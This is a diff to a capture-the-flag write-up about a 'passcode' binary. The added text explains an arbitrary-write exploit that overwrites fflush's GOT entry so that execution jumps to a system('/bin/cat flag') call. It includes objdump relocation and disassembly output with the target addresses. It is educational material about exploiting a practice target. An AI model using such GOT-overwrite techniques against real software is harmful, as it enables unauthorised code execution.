@@ -28,6 +28,36 @@ We should exploit the programming error. What do have regarding `passcode1`
 * We can control the content of passcode1.
 * We can provide data that's written to the location pointed by passcode1
 
-This is called as **writing an arbitrary value to an arbitrary location**, and it's very powerful.
+This is called as **writing an arbitrary value to an arbitrary location**, and it's very powerful. Since the binary is no PIE and RELRO is partial, I can manipulate GOT and change program execution.`fflush` is a good candidate as it's just called after first `scanf`.
+Let's check its address in GOT:
+```
+uzi@pwnpatrol:$ objdump -R passcode
+passcode:     file format elf32-i386
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a02c R_386_COPY        stdin@@GLIBC_2.0
+0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+...
+```
+We need to override the value with the address of `system("/bin/cat flag");`. This call in `login` function is below. Even though the call instruction is at `0x80485ea`, a function call consists of two phases:
+* Setting up the arguments (either pushing args to stack or setting registers depending on cpu, cpu mode, call type etc...).
+* Making the call.
+
+So we'll be using `0x80485e3` as the target value.
+```
+uzi@pwnpatrol:$ objdump -Mintel -d passcode | grep -A 40 "<login>:"
+08048564 <login>:
+ ...
+ 80485e3:       c7 04 24 af 87 04 08    mov    DWORD PTR [esp],0x80487af
+ 80485ea:       e8 71 fe ff ff          call   8048460 <system@plt>
+ ...
+```
+Along with the script, challange can be solved with a one-liner as well.
+
+
+
+
 
 
